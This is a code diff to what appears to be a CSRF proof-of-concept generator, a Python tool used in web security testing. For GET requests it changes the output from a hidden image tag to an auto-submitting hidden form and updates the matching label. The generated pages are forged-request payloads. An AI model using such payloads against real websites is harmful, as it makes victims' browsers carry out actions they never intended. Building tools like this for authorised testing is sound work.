@@ -671,10 +671,19 @@ def generate_csrf_poc(parsed):
     safe_method_js = _js_escape(method)
 
     if method == "GET":
+        from urllib.parse import urlparse, parse_qs
+        parsed_url = urlparse(url)
+        base_url = html_escape(f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}", quote=True)
+        params = parse_qs(parsed_url.query, keep_blank_values=True)
+        hidden_inputs = "".join(
+            f'    <input type="hidden" name="{html_escape(k, quote=True)}" value="{html_escape(v[0], quote=True)}">\n'
+            for k, v in params.items()
+        )
         inner = (
-            f'  <img src="{safe_url_attr}" width="0" height="0" />\n'
-            "  <!-- alternative: force navigation -->\n"
-            f"  <!-- <script>location='{safe_url_js}';</script> -->\n"
+            f'  <form id="csrf" method="GET" action="{base_url}">\n'
+            f"{hidden_inputs}"
+            "  </form>\n"
+            "  <script>document.getElementById('csrf').submit();</script>\n"
         )
         return _HTML_OPEN + inner + _HTML_CLOSE, "get"
 
@@ -821,7 +830,7 @@ def display_csrf_poc(html, parsed, poc_type, tokens=None, bypass_data=None):
     type_labels = {
         "form": "HTML form (auto-submit)",
         "json": "fetch() — JSON body",
-        "get": "img tag / navigation",
+        "get": "form GET / auto-submit",
         "multipart": "fetch() — FormData (fill fields manually)",
     }
 
